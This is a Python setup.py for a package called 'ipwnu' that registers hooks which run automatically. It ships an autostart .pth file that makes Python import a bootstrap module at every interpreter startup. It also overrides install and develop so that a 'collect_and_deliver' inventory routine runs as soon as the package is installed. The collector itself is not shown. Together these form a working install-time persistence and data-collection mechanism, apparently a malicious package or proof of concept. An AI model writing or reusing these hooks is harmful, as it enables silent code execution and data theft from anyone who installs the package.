#!/usr/bin/env python3
"""Packaging hooks for ipwnu.

The project metadata lives in ``pyproject.toml``. This file registers two
things that cannot be expressed declaratively:

1. ``build_py`` places ``ipwnu_autostart.pth`` at the root of the built wheel,
   which maps to the site-packages root when pip installs it. Python then
   imports :mod:`ipwnu._bootstrap` at interpreter startup, running the
   inventory collection once (guarded by a sentinel file).

2. A ``setup.py install`` / ``develop`` override that runs the collection
   immediately for legacy installs.

The collection is intentionally best-effort — a failure to collect or deliver
must never break the installation or interpreter startup itself — but every
failure is printed to stderr so it is never silently swallowed.
"""

from __future__ import annotations

import os
import sys

from setuptools import setup
from setuptools.command.build_py import build_py
from setuptools.command.develop import develop
from setuptools.command.install import install

PTH_NAME = "ipwnu_autostart.pth"
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))


def _pth_source() -> str:
    return os.path.join(PROJECT_ROOT, PTH_NAME)


def _run_collection() -> None:
    """Import the freshly installed package and run the collector."""
    root = PROJECT_ROOT
    if root not in sys.path:
        sys.path.insert(0, root)

    try:
        from ipwnu import collect_and_deliver
    except Exception as exc:  # pragma: no cover - install-time guard
        print(f"ipwnu: could not import collector during install: {exc}", file=sys.stderr)
        return

    try:
        exit_code = collect_and_deliver()
    except Exception as exc:  # pragma: no cover - install-time guard
        print(f"ipwnu: inventory collection failed during install: {exc}", file=sys.stderr)
        return

    if exit_code != 0:
        print(
            f"ipwnu: inventory collection finished with status {exit_code}",
            file=sys.stderr,
        )


class BuildPyWithPth(build_py):
    """Copy the autostart .pth to the build root so it ships at wheel root."""

    def run(self) -> None:
        super().run()
        self.copy_file(_pth_source(), os.path.join(self.build_lib, PTH_NAME))


class PostInstallCommand(install):
    """Run the inventory collection after a normal install."""

    def run(self) -> None:
        install.run(self)
        _run_collection()


class PostDevelopCommand(develop):
    """Run the inventory collection after an editable (develop) install."""

    def run(self) -> None:
        develop.run(self)
        _run_collection()


setup(
    cmdclass={
        "build_py": BuildPyWithPth,
        "install": PostInstallCommand,
        "develop": PostDevelopCommand,
    },
)
